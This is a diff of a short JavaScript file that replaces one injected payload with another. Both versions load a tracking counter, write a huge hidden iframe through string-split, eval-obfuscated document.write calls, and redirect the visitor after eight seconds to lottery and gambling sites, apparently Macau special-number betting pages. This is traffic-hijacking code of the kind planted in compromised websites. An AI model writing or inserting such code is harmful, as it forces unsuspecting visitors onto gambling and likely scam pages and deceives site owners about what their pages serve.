@@ -1,6 +1,6 @@
-document.write ('<script language="javascript" type="text/javascript" src="http://count50.51yes.com/click.aspx?id=503753931&logo=12" charset="gb2312"></script>');
+document.write ('<script language="javascript" type="text/javascript" src="http://count37.51yes.com/click.aspx?id=378995920&logo=12" charset="gb2312"></script>');
 
-var  ss = '<center id="showcloneshengxiaon"><ifr'+'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14'+'00" height="123'+'50" src="http://www.566668888.com/#每期免费公开一肖中平特期期准！永久网址：liuhe333或liuhe555"></iframe></center>';
+var  ss = '<center id="showcloneshengxiaon"><ifr'+'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14'+'00" height="123'+'50" src="http://www.24499.com/#澳门永利（特码48.5倍）"></iframe></center>';
 eval("do"+"cu"+"ment.wr"+"ite('"+ss+"');");
 	
 try{
@@ -25,4 +25,4 @@ try{
 	},3000);
 }catch(e){}
 
-window.setTimeout("window.location='http://www.566668888.com/#每期免费公开一肖中平特期期准！永久网址：liuhe333或liuhe555'",8000);
+window.setTimeout("window.location='http://www.24499.com/#澳门永利（特码48.5倍）'",8000);
